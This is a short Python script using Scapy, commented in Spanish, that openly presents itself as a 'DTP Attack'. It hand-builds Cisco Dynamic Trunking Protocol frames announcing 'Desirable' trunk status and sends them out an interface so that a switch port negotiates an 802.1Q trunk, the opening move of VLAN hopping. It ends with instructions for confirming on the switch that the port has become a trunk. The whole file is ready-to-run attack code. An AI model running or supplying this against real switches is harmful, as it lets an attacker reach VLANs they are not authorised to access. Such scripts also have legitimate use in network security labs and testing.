#!/usr/bin/env python3
"""
DTP Attack - Trama 'Desirable' para forzar negociacion de trunk
Requisitos: Scapy, interfaz conectada a puerto en modo dynamic auto/desirable
Uso: sudo python3 dtp_attack.py
"""
from scapy.all import *

interfaz = "eth1"

# ---- DTP frame manual ----
# Estructura DTP:
# Byte0: version (1)
# TLVs: cada uno = [type(2 bytes)][length(2 bytes)][value]
#   TLV Domain: type=0x0001
#   TLV Status: type=0x0002, value 1 byte (0x03 = Desirable)
#   TLV DTP Type: type=0x0003, value 1 byte (0xa1 = trunk 802.1Q negotiate)
#   TLV Neighbor: type=0x0004, value 6 bytes (MAC)

def tlv(ttype, value):
    length = len(value) + 4   # incluye los 4 bytes de type+length
    return ttype.to_bytes(2, 'big') + length.to_bytes(2, 'big') + value

domain = b""  # vacio si no se conoce dominio especifico
domain_tlv = tlv(0x0001, domain)
status_tlv = tlv(0x0002, b"\x03")          # Desirable
type_tlv   = tlv(0x0003, b"\xa1")          # Trunk, 802.1Q
neighbor_mac = bytes.fromhex("001122334455")
neighbor_tlv = tlv(0x0004, neighbor_mac)

dtp_payload = bytes([0x01]) + domain_tlv + status_tlv + type_tlv + neighbor_tlv

dtp_pkt = (
    Ether(dst="01:00:0c:cc:cc:cc") /
    LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
    SNAP(OUI=0x00000c, code=0x2004) /  # 0x2004 = DTP
    Raw(load=dtp_payload)
)

print("[*] Enviando tramas DTP 'Desirable' por %s ..." % interfaz)
sendp(dtp_pkt, iface=interfaz, count=10, inter=1, verbose=False)
print("[+] Paquetes DTP enviados.")
print("[+] Verifica en el switch: show interfaces <puerto> switchport")
print("[+] 'Operational Mode' deberia cambiar a 'trunk' (en switches con DTP completo).")
